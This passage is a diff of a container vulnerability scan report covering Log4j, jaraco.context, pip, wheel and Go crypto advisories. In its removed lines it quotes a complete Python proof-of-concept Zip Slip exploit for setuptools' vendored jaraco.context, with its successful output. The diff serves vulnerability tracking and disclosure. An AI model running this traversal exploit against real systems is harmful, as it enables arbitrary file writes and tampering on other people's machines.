@@ -700,8 +700,8 @@
 │                             │                          osystem%3Amaven 
 │                             ├ Fingerprint     : sha256:5f27b1acb93890e2a4fee3566eb6694bb3cab26edb878fcb00700c
 │                             │                   4497a22fe0 
-│                             ├ Title           : Apache Log4j: Apache Log4j Core: Missing TLS hostname
-│                             │                   verification in Socket appender 
+│                             ├ Title           : Apache Log4j: Apache Log4j Core: Information disclosure via
+│                             │                   missing TLS hostname verification 
 │                             ├ Description     : The Socket Appender in Apache Log4j Core versions 2.0-beta9
 │                             │                   through 2.25.2 does not perform TLS hostname verification of
 │                             │                   the peer certificate, even when the  verifyHostName
@@ -1140,7 +1140,7 @@
 │     │                        │                      d229b68f52d773 
 │     │                        ╰ FilePath  : usr/lib/python3.12/site-packages/setuptools/_vendor/zipp-3.19.2.di
 │     │                                      st-info/METADATA 
-│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-58pv-8j8x-9vj2 
+│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-23949 
 │                       │     ├ PkgName         : jaraco.context 
 │                       │     ├ PkgPath         : usr/lib/python3.12/site-packages/setuptools/_vendor/jaraco.co
 │                       │     │                   ntext-5.3.0.dist-info/METADATA 
@@ -1154,363 +1154,173 @@
 │                       │     │                  ╰ DiffID: sha256:dec68ef13d7f89a7af98553a8fe998c330c065d7a3950
 │                       │     │                            478f2d229b68f52d773 
 │                       │     ├ SeveritySource  : ghsa 
-│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-58pv-8j8x-9vj2 
+│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-23949 
 │                       │     ├ DataSource       ╭ ID  : ghsa 
 │                       │     │                  ├ Name: GitHub Security Advisory pip 
 │                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
 │                       │     │                          osystem%3Apip 
-│                       │     ├ Fingerprint     : sha256:1c161d66fe31cb7f3b2be833cb3294efdf7112ac9038ffa1fecc95
-│                       │     │                   7b696aaf68 
-│                       │     ├ Title           : jaraco.context Has a Path Traversal Vulnerability 
-│                       │     ├ Description     : ### Summary
-│                       │     │                   There is a Zip Slip path traversal vulnerability in the
-│                       │     │                   jaraco.context package affecting setuptools as well, in
-│                       │     │                   `jaraco.context.tarball()` function. The vulnerability may
-│                       │     │                   allow attackers to extract files outside the intended
-│                       │     │                   extraction directory when malicious tar archives are
-│                       │     │                   processed.
-│                       │     │                   The strip_first_component filter splits the path on the first
-│                       │     │                    `/` and extracts the second component, while allowing `../`
+│                       │     ├ Fingerprint     : sha256:87a3e44ce195a88254a71a2c3d4cc1587fc09c708b58ab1b25a8b1
+│                       │     │                   ed4c1291ae 
+│                       │     ├ Title           : jaraco.context: jaraco.context: Path traversal via malicious
+│                       │     │                   tar archives 
+│                       │     ├ Description     : jaraco.context, an open-source software package that provides
+│                       │     │                    some useful decorators and context managers, has a Zip Slip
+│                       │     │                   path traversal vulnerability in the
+│                       │     │                   `jaraco.context.tarball()` function starting in version 5.2.0
+│                       │     │                    and prior to version 6.1.0. The vulnerability may allow
+│                       │     │                   attackers to extract files outside the intended extraction
+│                       │     │                   directory when malicious tar archives are processed. The
+│                       │     │                   strip_first_component filter splits the path on the first `/`
+│                       │     │                    and extracts the second component, while allowing `../`
 │                       │     │                   sequences. Paths like `dummy_dir/../../etc/passwd` become
-│                       │     │                   `../../etc/passwd`.
-│                       │     │                   Note that this suffers from a nested tarball attack as well
-│                       │     │                   with multi-level tar files such as `dummy_dir/inner.tar.gz`,
-│                       │     │                   where the inner.tar.gz includes a traversal
-│                       │     │                   `dummy_dir/../../config/.env` that also gets translated to
-│                       │     │                   `../../config/.env`.
-│                       │     │                   
-│                       │     │                   The code can be found:
-│                       │     │                   -
-│                       │     │                   https://github.com/jaraco/jaraco.context/blob/main/jaraco/con
-│                       │     │                   text/__init__.py#L74-L91
-│                       │     │                   https://github.com/pypa/setuptools/blob/main/setuptools/_vend
-│                       │     │                   or/jaraco/context.py#L55-L76 (inherited)
-│                       │     │                   This report was also sent to setuptools maintainers and they
-│                       │     │                   asked some questions regarding this.
-│                       │     │                   The lengthy answer is:
-│                       │     │                   The vulnerability seems to be the `strip_first_component`
-│                       │     │                   filter function, not the tarball function itself and has the
-│                       │     │                   same behavior on any tested Python version locally (from 11
-│                       │     │                   to 14, as I noticed that there is a backports conditional for
-│                       │     │                    the tarball).
-│                       │     │                   The stock tarball for Python 3.12+ is considered not
-│                       │     │                   vulnerable (until proven otherwise 😄) but here the custom
-│                       │     │                   filter seems to overwrite the native filtering and introduces
-│                       │     │                    the issue - while overwriting the updated secure Python
-│                       │     │                   3.12+ behavior and giving a false sense of sanitization.
-│                       │     │                   The short answer is:
-│                       │     │                   If we are talking about Python < 3.12 the tarball and jaraco
-│                       │     │                   implementations /  behaviors are relatively the same but for
-│                       │     │                   Python 3.12+ the jaraco implementation overwrites the native
-│                       │     │                   tarball protection.
-│                       │     │                   Sampled tests:
-│                       │     │                   <img width="1634" height="245" alt="image"
-│                       │     │                   src="https://github.com/user-attachments/assets/ce6c0de6-bb53
-│                       │     │                   -4c2b-818a-d77e28d2fbeb" />
-│                       │     │                   ### Details
-│                       │     │                   The flow with setuptools in the mix:
-│                       │     │                   ```
-│                       │     │                   setuptools._vendor.jaraco.context.tarball() > req =
-│                       │     │                   urlopen(url) > with tarfile.open(fileobj=req, mode='r|*') as
-│                       │     │                   tf: > tf.extractall(path=target_dir,
-│                       │     │                   filter=strip_first_component) > strip_first_component
-│                       │     │                   (Vulnerable)
-│                       │     │                   ### PoC
-│                       │     │                   This was tested on multiple Python versions > 11 on a Debian
-│                       │     │                   GNU 12 (bookworm).
-│                       │     │                   You can run this directly after having all the dependencies:
-│                       │     │                   ```py
-│                       │     │                   #!/usr/bin/env python3
-│                       │     │                   import tarfile
-│                       │     │                   import io
-│                       │     │                   import os
-│                       │     │                   import sys
-│                       │     │                   import shutil
-│                       │     │                   import tempfile
-│                       │     │                   from setuptools._vendor.jaraco.context import
-│                       │     │                   strip_first_component
-│                       │     │                   def create_malicious_tarball():
-│                       │     │                       tar_data = io.BytesIO()
-│                       │     │                       with tarfile.open(fileobj=tar_data, mode='w') as tar:
-│                       │     │                           # Create a malicious file path with traversal
-│                       │     │                   sequences
-│                       │     │                           malicious_files = [
-│                       │     │                               # Attempt 1: Simple traversal to /tmp
-│                       │     │                               {
-│                       │     │                                   'path':
-│                       │     │                   'dummy_dir/../../tmp/pwned_by_zipslip.txt',
-│                       │     │                                   'content': b'[ZIPSLIP] File written to /tmp
-│                       │     │                   via path traversal!',
-│                       │     │                                   'name': 'pwned_via_tmp'
-│                       │     │                               },
-│                       │     │                               # Attempt 2: Try to write to home directory
-│                       │     │                   'dummy_dir/../../../../home/pwned_home.txt',
-│                       │     │                                   'content': b'[ZIPSLIP] Attempted write to
-│                       │     │                   home directory',
-│                       │     │                                   'name': 'pwned_via_home'
-│                       │     │                               # Attempt 3: Try to write to current directory
-│                       │     │                   parent
-│                       │     │                                   'path': 'dummy_dir/../escaped.txt',
-│                       │     │                                   'content': b'[ZIPSLIP] File in parent
-│                       │     │                   directory!',
-│                       │     │                                   'name': 'pwned_escaped'
-│                       │     │                               # Attempt 4: Legitimate file for comparison
-│                       │     │                                   'path': 'dummy_dir/legitimate_file.txt',
-│                       │     │                                   'content': b'This file stays in target
-│                       │     │                   directory',
-│                       │     │                                   'name': 'legitimate'
-│                       │     │                               }
-│                       │     │                           ]
-│                       │     │                           for file_info in malicious_files:
-│                       │     │                               content = file_info['content']
-│                       │     │                               tarinfo =
-│                       │     │                   tarfile.TarInfo(name=file_info['path'])
-│                       │     │                               tarinfo.size = len(content)
-│                       │     │                               tar.addfile(tarinfo, io.BytesIO(content))
-│                       │     │                       tar_data.seek(0)
-│                       │     │                       return tar_data
-│                       │     │                   def exploit_zipslip():
-│                       │     │                       print("[*] Target:
-│                       │     │                   setuptools._vendor.jaraco.context.tarball()")
-│                       │     │                       # Create temporary directory for extraction
-│                       │     │                       temp_base = tempfile.mkdtemp(prefix="zipslip_test_")
-│                       │     │                       target_dir = os.path.join(temp_base,
-│                       │     │                   "extraction_target")
-│                       │     │                       try:
-│                       │     │                           os.mkdir(target_dir)
-│                       │     │                           print(f"[+] Created target extraction directory:
-│                       │     │                   {target_dir}")
-│                       │     │                           # Create malicious tarball
-│                       │     │                           print("[*] Creating malicious tar archive...")
-│                       │     │                           tar_data = create_malicious_tarball()
-│                       │     │                           try:
-│                       │     │                               with tarfile.open(fileobj=tar_data, mode='r') as
-│                       │     │                   tf:
-│                       │     │                                   for member in tf:
-│                       │     │                                       # Apply the ACTUAL vulnerable function
-│                       │     │                   from setuptools
-│                       │     │                                       processed_member =
-│                       │     │                   strip_first_component(member, target_dir)
-│                       │     │                                       print(f"[*] Extracting: {member.name:40}
-│                       │     │                   -> {processed_member.name}")
-│                       │     │                                       
-│                       │     │                                       # Extract to target directory
-│                       │     │                                       try:
-│                       │     │                                           tf.extract(processed_member,
-│                       │     │                   path=target_dir)
-│                       │     │                                           print(f"    ✓ Extracted
-│                       │     │                   successfully")
-│                       │     │                                       except (PermissionError,
-│                       │     │                   FileNotFoundError) as e:
-│                       │     │                                           print(f"    ! {type(e).__name__}:
-│                       │     │                   Path traversal ATTEMPTED")
-│                       │     │                           except Exception as e:
-│                       │     │                               print(f"[!] Extraction raised exception:
-│                       │     │                   {type(e).__name__}: {e}")
-│                       │     │                           
-│                       │     │                           # Check results
-│                       │     │                           print("[*] Checking for extracted files...")
-│                       │     │                           # Check target directory
-│                       │     │                           print(f"[*] Files in target directory
-│                       │     │                   ({target_dir}):")
-│                       │     │                           if os.path.exists(target_dir):
-│                       │     │                               for root, _, files in os.walk(target_dir):
-│                       │     │                                   level = root.replace(target_dir,
-│                       │     │                   '').count(os.sep)
-│                       │     │                                   indent = ' ' * 2 * level
-│                       │     │                                   print(f"{indent}{os.path.basename(root)}/")
-│                       │     │                                   subindent = ' ' * 2 * (level + 1)
-│                       │     │                                   for file in files:
-│                       │     │                                       filepath = os.path.join(root, file)
-│                       │     │                                           with open(filepath, 'r') as f:
-│                       │     │                                               content = f.read()[:50]
-│                       │     │                                           print(f"{subindent}{file}")
-│                       │     │                                           print(f"{subindent}  └─
-│                       │     │                   {content}...")
-│                       │     │                                       except:
-│                       │     │                                           print(f"{subindent}{file} (binary)")
-│                       │     │                           else:
-│                       │     │                               print(f"[!] Target directory not found!")
-│                       │     │                           print()
-│                       │     │                           print("[*] Checking for traversal attempts...")
-│                       │     │                           # Check if files escaped
-│                       │     │                           traversal_attempts = [
-│                       │     │                               ("/tmp/pwned_by_zipslip.txt", "Escape to /tmp"),
-│                       │     │                               (os.path.expanduser("~/pwned_home.txt"), "Escape
-│                       │     │                   to home"),
-│                       │     │                               (os.path.join(temp_base, "escaped.txt"), "Escape
-│                       │     │                   to parent"),
-│                       │     │                           escaped = False
-│                       │     │                           for check_path, description in traversal_attempts:
-│                       │     │                               if os.path.exists(check_path):
-│                       │     │                                   print(f"[+] Path Traversal Confirmed:
-│                       │     │                   {description}")
-│                       │     │                                   print(f"      File created at:
-│                       │     │                   {check_path}")
-│                       │     │                                   try:
-│                       │     │                                       with open(check_path, 'r') as f:
-│                       │     │                                           content = f.read()
-│                       │     │                                       print(f"      Content: {content}")
-│                       │     │                                       print(f"      Removing: {check_path}")
-│                       │     │                                       os.remove(check_path)
-│                       │     │                                   except Exception as e:
-│                       │     │                                       print(f"      Error reading: {e}")
-│                       │     │                                   escaped = True
-│                       │     │                               else:
-│                       │     │                                   print(f"[-] OK: {description} - No escape
-│                       │     │                   detected")
-│                       │     │                           if escaped:
-│                       │     │                               print("[+] EXPLOIT SUCCESSFUL - Path traversal
-│                       │     │                   vulnerability confirmed!")
-│                       │     │                               print("[-] No path traversal detected (mitigation
-│                       │     │                    in place)")
-│                       │     │                       finally:
-│                       │     │                           # Cleanup
-│                       │     │                           print(f"[*] Cleaning up: {temp_base}")
-│                       │     │                               shutil.rmtree(temp_base)
-│                       │     │                               print(f"[!] Cleanup error: {e}")
-│                       │     │                   def check_python_version():
-│                       │     │                       print(f"[+] Python version: {sys.version}")
-│                       │     │                       # Python 3.11.4+ added DEFAULT_FILTER
-│                       │     │                       if hasattr(tarfile, 'DEFAULT_FILTER'):
-│                       │     │                           print("[+] Python has DEFAULT_FILTER (tarfile
-│                       │     │                   security hardening)")
-│                       │     │                       else:
-│                       │     │                           print("[!] Python does not have DEFAULT_FILTER (older
-│                       │     │                    version)")    
-│                       │     │                       print()
-│                       │     │                   if __name__ == "__main__":
-│                       │     │                       check_python_version()
-│                       │     │                       exploit_zipslip()
-│                       │     │                   Output:
-│                       │     │                   [+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC
-│                       │     │                    12.2.0] 
-│                       │     │                   [!] Python does not have DEFAULT_FILTER (older version) 
-│                       │     │                   [*] Target: setuptools._vendor.jaraco.context.tarball() 
-│                       │     │                   [+] Created target extraction directory:
-│                       │     │                   /tmp/zipslip_test_tnu3qpd5/extraction_target 
-│                       │     │                   [*] Creating malicious tar archive... 
-│                       │     │                   [*] Extracting: ../../tmp/pwned_by_zipslip.txt           ->
-│                       │     │                   ../../tmp/pwned_by_zipslip.txt 
-│                       │     │                       ✓ Extracted successfully 
-│                       │     │                   [*] Extracting: ../../../../home/pwned_home.txt          ->
-│                       │     │                   ../../../../home/pwned_home.txt 
-│                       │     │                       ! PermissionError: Path traversal ATTEMPTED 
-│                       │     │                   [*] Extracting: ../escaped.txt                           ->
-│                       │     │                   ../escaped.txt 
-│                       │     │                   [*] Extracting: legitimate_file.txt                      ->
-│                       │     │                   legitimate_file.txt 
-│                       │     │                   [*] Checking for extracted files... 
-│                       │     │                   [*] Files in target directory
-│                       │     │                   (/tmp/zipslip_test_tnu3qpd5/extraction_target): 
-│                       │     │                   extraction_target/ 
-│                       │     │                     legitimate_file.txt 
-│                       │     │                       └─ This file stays in target directory... 
-│                       │     │                   [*] Checking for traversal attempts... 
-│                       │     │                   [-] OK: Escape to /tmp - No escape detected 
-│                       │     │                   [-] OK: Escape to home - No escape detected 
-│                       │     │                   [+] Path Traversal Confirmed: Escape to parent 
-│                       │     │                         File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt
-│                       │     │                    
-│                       │     │                         Content: [ZIPSLIP] File in parent directory! 
-│                       │     │                         Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt 
-│                       │     │                   [+] EXPLOIT SUCCESSFUL - Path traversal vulnerability
-│                       │     │                   confirmed! 
-│                       │     │                   [*] Cleaning up: /tmp/zipslip_test_tnu3qpd5
-│                       │     │                   ### Impact
-│                       │     │                   - Arbitrary file creation in filesystem (HIGH exploitability)
-│                       │     │                    - especially if popular packages download tar files remotely
-│                       │     │                    and use this package to extract files.
-│                       │     │                   - Privesc (LOW exploitability)
-│                       │     │                   - Supply-Chain attack (VARIABLE exploitability) - relevant to
-│                       │     │                    the first point.
-│                       │     │                   ### Remediation
-│                       │     │                   I guess removing the custom filter is not feasible given the
-│                       │     │                   backward compatibility issues that might come up you can use
-│                       │     │                   a safer filter `strip_first_component` that skips or
-│                       │     │                   sanitizes `../` character sequences since it is already there
-│                       │     │                    eg.
-│                       │     │                   if member.name.startswith('/') or '..' in member.name:
-│                       │     │                     raise ValueError(f"Attempted path traversal detected:
-│                       │     │                   {member.name}") 
+│                       │     │                   `../../etc/passwd`. Note that this suffers from a nested
+│                       │     │                   tarball attack as well with multi-level tar files such as
+│                       │     │                   `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a
+│                       │     │                   traversal `dummy_dir/../../config/.env` that also gets
+│                       │     │                   translated to `../../config/.env`. Version 6.1.0 contains a
+│                       │     │                   patch for the issue. 
 │                       │     ├ Severity        : HIGH 
-│                       │     ├ VendorSeverity   ─ ghsa: 3 
-│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N 
-│                       │     │                         ╰ V3Score : 8.6 
-│                       │     ├ References       ╭ [0]: https://github.com/jaraco/jaraco.context 
-│                       │     │                  ├ [1]: https://github.com/jaraco/jaraco.context/commit/7b26a42
+│                       │     ├ CweIDs           ─ [0]: CWE-22 
+│                       │     ├ VendorSeverity   ╭ ghsa  : 3 
+│                       │     │                  ╰ redhat: 3 
+│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/
+│                       │     │                  │        │           A:N 
+│                       │     │                  │        ╰ V3Score : 8.6 
+│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/
+│                       │     │                           │           A:N 
+│                       │     │                           ╰ V3Score : 8.6 
+│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-23949 
+│                       │     │                  ├ [1]: https://github.com/jaraco/jaraco.context 
+│                       │     │                  ├ [2]: https://github.com/jaraco/jaraco.context/blob/main/jara
+│                       │     │                  │      co/context/__init__.py#L74-L91 
+│                       │     │                  ├ [3]: https://github.com/jaraco/jaraco.context/commit/7b26a42
 │                       │     │                  │      b525735e4085d2e994e13802ea339d5f9 
-│                       │     │                  ╰ [2]: https://github.com/jaraco/jaraco.context/security/advis
-│                       │     │                         ories/GHSA-58pv-8j8x-9vj2 
-│                       │     ├ PublishedDate   : 2026-01-13T21:48:17Z 
-│                       │     ╰ LastModifiedDate: 2026-01-13T21:48:17Z 
-│                       ╰ [1] ╭ VulnerabilityID : CVE-2025-8869 
-│                             ├ PkgName         : pip 
-│                             ├ PkgPath         : usr/lib/python3.12/site-packages/pip-25.1.1.dist-info/METADATA 
-│                             ├ PkgIdentifier    ╭ PURL: pkg:pypi/pip@25.1.1 
-│                             │                  ╰ UID : f93d18504d4fdf15 
-│                             ├ InstalledVersion: 25.1.1 
-│                             ├ FixedVersion    : 25.3 
+│                       │     │                  ├ [4]: https://github.com/jaraco/jaraco.context/security/advis
+│                       │     │                  │      ories/GHSA-58pv-8j8x-9vj2 
+│                       │     │                  ├ [5]: https://github.com/pypa/setuptools/blob/main/setuptools
+│                       │     │                  │      /_vendor/jaraco/context.py#L55-L76 
+│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-23949 
+│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-23949 
+│                       │     ├ PublishedDate   : 2026-01-20T01:15:57.723Z 
+│                       │     ╰ LastModifiedDate: 2026-01-20T01:15:57.723Z 
+│                       ├ [1] ╭ VulnerabilityID : CVE-2025-8869 
+│                       │     ├ PkgName         : pip 
+│                       │     ├ PkgPath         : usr/lib/python3.12/site-packages/pip-25.1.1.dist-info/METADATA 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:pypi/pip@25.1.1 
+│                       │     │                  ╰ UID : f93d18504d4fdf15 
+│                       │     ├ InstalledVersion: 25.1.1 
+│                       │     ├ FixedVersion    : 25.3 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:07ea076c6cf197f1aa824b3abdc29f7138e13b80f8e5c
+│                       │     │                  │         23d576cc7fbfc24b686 
+│                       │     │                  ╰ DiffID: sha256:dec68ef13d7f89a7af98553a8fe998c330c065d7a3950
+│                       │     │                            478f2d229b68f52d773 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-8869 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory pip 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Apip 
+│                       │     ├ Fingerprint     : sha256:c5fddf47a726d63a36040299124da114c878b3cf9d47141357bdfb
+│                       │     │                   e65c2647e6 
+│                       │     ├ Title           : pip: pip missing checks on symbolic link extraction 
+│                       │     ├ Description     : When extracting a tar archive pip may not check symbolic
+│                       │     │                   links point into the extraction directory if the tarfile
+│                       │     │                   module doesn't implement PEP 706.
+│                       │     │                   Note that upgrading pip to a "fixed" version for this
+│                       │     │                   vulnerability doesn't fix all known vulnerabilities that are
+│                       │     │                   remediated by using a Python version that implements PEP
+│                       │     │                   706.
+│                       │     │                   
+│                       │     │                   Note that this is a vulnerability in pip's fallback
+│                       │     │                   implementation of tar extraction for Python versions that
+│                       │     │                   don't implement PEP 706
+│                       │     │                   and therefore are not secure to all vulnerabilities in the
+│                       │     │                   Python 'tarfile' module. If you're using a Python version
+│                       │     │                   that implements PEP 706
+│                       │     │                   then pip doesn't use the "vulnerable" fallback code.
+│                       │     │                   Mitigations include upgrading to a version of pip that
+│                       │     │                   includes the fix, upgrading to a Python version that
+│                       │     │                   implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or
+│                       │     │                   >=3.12),
+│                       │     │                   applying the linked patch, or inspecting source distributions
+│                       │     │                    (sdists) before installation as is already a best-practice. 
+│                       │     ├ Severity        : MEDIUM 
+│                       │     ├ VendorSeverity   ╭ amazon: 2 
+│                       │     │                  ├ azure : 2 
+│                       │     │                  ├ ghsa  : 2 
+│                       │     │                  ├ redhat: 2 
+│                       │     │                  ╰ ubuntu: 2 
+│                       │     ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/
+│                       │     │                           │           A:N 
+│                       │     │                           ╰ V3Score : 5.3 
+│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-8869 
+│                       │     │                  ├ [1]: https://github.com/pypa/pip 
+│                       │     │                  ├ [2]: https://github.com/pypa/pip/commit/f2b92314da012b9fffa3
+│                       │     │                  │      6b3f3e67748a37ef464a 
+│                       │     │                  ├ [3]: https://github.com/pypa/pip/pull/13550 
+│                       │     │                  ├ [4]: https://lists.debian.org/debian-lts-announce/2025/10/ms
+│                       │     │                  │      g00028.html 
+│                       │     │                  ├ [5]: https://mail.python.org/archives/list/security-announce
+│                       │     │                  │      @python.org/thread/IF5A3GCJY3VH7BVHJKOWOJFKTW7VFQEN 
+│                       │     │                  ├ [6]: https://mail.python.org/archives/list/security-announce
+│                       │     │                  │      @python.org/thread/IF5A3GCJY3VH7BVHJKOWOJFKTW7VFQEN/ 
+│                       │     │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2025-8869 
+│                       │     │                  ├ [8]: https://pip.pypa.io/en/stable/news/#v25-2 
+│                       │     │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2025-8869 
+│                       │     ├ PublishedDate   : 2025-09-24T15:15:41.293Z 
+│                       │     ╰ LastModifiedDate: 2025-11-03T18:17:02.783Z 
+│                       ╰ [2] ╭ VulnerabilityID : CVE-2026-24049 
+│                             ├ PkgName         : wheel 
+│                             ├ PkgPath         : usr/lib/python3.12/site-packages/setuptools/_vendor/wheel-0.4
+│                             │                   5.1.dist-info/METADATA 
+│                             ├ PkgIdentifier    ╭ PURL: pkg:pypi/wheel@0.45.1 
+│                             │                  ╰ UID : 2148fb80df2f4b35 
+│                             ├ InstalledVersion: 0.45.1 
+│                             ├ FixedVersion    : 0.46.2 
 │                             ├ Status          : fixed 
 │                             ├ Layer            ╭ Digest: sha256:07ea076c6cf197f1aa824b3abdc29f7138e13b80f8e5c
 │                             │                  │         23d576cc7fbfc24b686 
 │                             │                  ╰ DiffID: sha256:dec68ef13d7f89a7af98553a8fe998c330c065d7a3950
 │                             │                            478f2d229b68f52d773 
 │                             ├ SeveritySource  : ghsa 
-│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-8869 
+│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-24049 
 │                             ├ DataSource       ╭ ID  : ghsa 
 │                             │                  ├ Name: GitHub Security Advisory pip 
 │                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
 │                             │                          osystem%3Apip 
-│                             ├ Fingerprint     : sha256:c5fddf47a726d63a36040299124da114c878b3cf9d47141357bdfb
-│                             │                   e65c2647e6 
-│                             ├ Title           : pip: pip missing checks on symbolic link extraction 
-│                             ├ Description     : When extracting a tar archive pip may not check symbolic
-│                             │                   links point into the extraction directory if the tarfile
-│                             │                   module doesn't implement PEP 706.
-│                             │                   Note that upgrading pip to a "fixed" version for this
-│                             │                   vulnerability doesn't fix all known vulnerabilities that are
-│                             │                   remediated by using a Python version that implements PEP
-│                             │                   706.
-│                             │                   
-│                             │                   Note that this is a vulnerability in pip's fallback
-│                             │                   implementation of tar extraction for Python versions that
-│                             │                   don't implement PEP 706
-│                             │                   and therefore are not secure to all vulnerabilities in the
-│                             │                   Python 'tarfile' module. If you're using a Python version
-│                             │                   that implements PEP 706
-│                             │                   then pip doesn't use the "vulnerable" fallback code.
-│                             │                   Mitigations include upgrading to a version of pip that
-│                             │                   includes the fix, upgrading to a Python version that
-│                             │                   implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or
-│                             │                   >=3.12),
-│                             │                   applying the linked patch, or inspecting source distributions
-│                             │                    (sdists) before installation as is already a best-practice. 
-│                             ├ Severity        : MEDIUM 
-│                             ├ VendorSeverity   ╭ amazon: 2 
-│                             │                  ├ azure : 2 
-│                             │                  ├ ghsa  : 2 
-│                             │                  ├ redhat: 2 
-│                             │                  ╰ ubuntu: 2 
-│                             ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/
-│                             │                           │           A:N 
-│                             │                           ╰ V3Score : 5.3 
-│                             ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-8869 
-│                             │                  ├ [1]: https://github.com/pypa/pip 
-│                             │                  ├ [2]: https://github.com/pypa/pip/commit/f2b92314da012b9fffa3
-│                             │                  │      6b3f3e67748a37ef464a 
-│                             │                  ├ [3]: https://github.com/pypa/pip/pull/13550 
-│                             │                  ├ [4]: https://lists.debian.org/debian-lts-announce/2025/10/ms
-│                             │                  │      g00028.html 
-│                             │                  ├ [5]: https://mail.python.org/archives/list/security-announce
-│                             │                  │      @python.org/thread/IF5A3GCJY3VH7BVHJKOWOJFKTW7VFQEN 
-│                             │                  ├ [6]: https://mail.python.org/archives/list/security-announce
-│                             │                  │      @python.org/thread/IF5A3GCJY3VH7BVHJKOWOJFKTW7VFQEN/ 
-│                             │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2025-8869 
-│                             │                  ├ [8]: https://pip.pypa.io/en/stable/news/#v25-2 
-│                             │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2025-8869 
-│                             ├ PublishedDate   : 2025-09-24T15:15:41.293Z 
-│                             ╰ LastModifiedDate: 2025-11-03T18:17:02.783Z 
+│                             ├ Fingerprint     : sha256:0c24e09c4d738b8ea2aa815698a3079573aa0dd7cb1d4f553631a6
+│                             │                   d10585ace2 
+│                             ├ Title           : Wheel Affected by Arbitrary File Permission Modification via
+│                             │                   Path Traversal in wheel unpack 
+│                             ├ Description     : wheel is a command line tool for manipulating Python wheel
+│                             │                   files, as defined in PEP 427. In versions 0.46.1 and below,
+│                             │                   the unpack function is vulnerable to file permission
+│                             │                   modification through mishandling of file permissions after
+│                             │                   extraction. The logic blindly trusts the filename from the
+│                             │                   archive header for the chmod operation, even though the
+│                             │                   extraction process itself might have sanitized the path.
+│                             │                   Attackers can craft a malicious wheel file that, when
+│                             │                   unpacked, changes the permissions of critical system files
+│                             │                   (e.g., /etc/passwd, SSH keys, config files), allowing for
+│                             │                   Privilege Escalation or arbitrary code execution by modifying
+│                             │                    now-writable scripts. This issue has been fixed in version
+│                             │                   0.46.2. 
+│                             ├ Severity        : HIGH 
+│                             ├ CweIDs           ╭ [0]: CWE-22 
+│                             │                  ╰ [1]: CWE-732 
+│                             ├ VendorSeverity   ─ ghsa: 3 
+│                             ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H 
+│                             │                         ╰ V3Score : 7.1 
+│                             ├ References       ╭ [0]: https://github.com/pypa/wheel 
+│                             │                  ├ [1]: https://github.com/pypa/wheel/commit/7a7d2de96b22a9adf9
+│                             │                  │      208afcc9547e1001569fef 
+│                             │                  ├ [2]: https://github.com/pypa/wheel/releases/tag/0.46.2 
+│                             │                  ├ [3]: https://github.com/pypa/wheel/security/advisories/GHSA-
+│                             │                  │      8rrh-rw8j-w5fx 
+│                             │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-24049 
+│                             ├ PublishedDate   : 2026-01-22T05:16:23.157Z 
+│                             ╰ LastModifiedDate: 2026-01-22T05:16:23.157Z 
 ├ [4] ╭ Target         : usr/bin/prometheus 
 │     ├ Class          : lang-pkgs 
 │     ├ Type           : gobinary 
@@ -4056,8 +3866,8 @@
 │                       │      │                          cosystem%3Ago 
 │                       │      ├ Fingerprint     : sha256:1cebf523ee8af4c08afe0324ee2c783d88a0bdb4f118df52df715
 │                       │      │                   25eaeed7e9b 
-│                       │      ├ Title           : golang.org/x/crypto/ssh/agent: in
-│                       │      │                   golang.org/x/crypto/ssh/agent 
+│                       │      ├ Title           : golang.org/x/crypto/ssh/agent: SSH Agent servers: Denial of
+│                       │      │                   Service due to malformed messages 
 │                       │      ├ Description     : SSH Agent servers do not validate the size of messages when
 │                       │      │                   processing new identity requests, which may cause the
 │                       │      │                   program to panic if the message is malformed due to an out
@@ -4104,7 +3914,9 @@
 │                       │      │                          cosystem%3Ago 
 │                       │      ├ Fingerprint     : sha256:8f58aeea797b86d88b204b429f1f118f8e49598bed774a466f2ec
 │                       │      │                   970c18045d3 
